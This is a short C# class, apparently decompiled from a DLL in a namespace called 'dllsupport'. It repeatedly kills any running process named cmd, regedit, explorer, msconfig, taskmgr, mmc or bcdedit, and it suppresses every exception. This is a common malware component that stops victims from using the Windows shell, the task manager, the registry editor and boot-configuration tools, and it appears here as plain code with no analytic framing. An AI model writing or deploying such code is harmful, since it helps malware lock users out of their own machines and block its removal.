using System.Diagnostics;

namespace dllsupport;

public class KillProcess
{
	public static void kill()
	{
		try
		{
			string[] array = new string[8] { "cmd", "regedit", "explorer", "msconfig", "explorer", "taskmgr", "mmc", "bcdedit" };
			string[] array2 = array;
			foreach (string processName in array2)
			{
				Process[] processesByName = Process.GetProcessesByName(processName);
				for (int j = 0; j < processesByName.Length; j = checked(j + 1))
				{
					processesByName[j]?.Kill();
				}
			}
		}
		catch
		{
		}
	}
}
